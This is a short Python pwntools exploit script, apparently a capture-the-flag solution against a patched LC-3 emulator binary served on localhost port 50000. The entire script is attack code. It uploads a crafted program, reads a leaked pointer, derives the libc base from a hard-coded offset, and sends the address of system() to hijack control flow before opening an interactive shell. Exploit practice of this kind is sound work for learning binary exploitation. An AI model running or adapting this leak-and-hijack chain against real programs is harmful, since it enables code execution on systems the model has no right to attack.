from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe = ELF('./lc3emu_patched')

libc = ELF('./libc.so.6')

gdbscript = '''
c
'''
#breakrva 0x1d0f

program = open('./exploit.obj', 'rb').read().hex()

#io = gdb.debug(exe.path, gdbscript)
#io = process(exe.path)
io = remote('localhost', 50000)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b': ', program.encode())

leak = int(io.readline().strip(), 16)

log.info(f'leak: {hex(leak)}')

libc.address = leak - 0x7e70a

log.success(f'libc base: {hex(libc.address)}')

io.send(p64(libc.sym['system']))

io.interactive()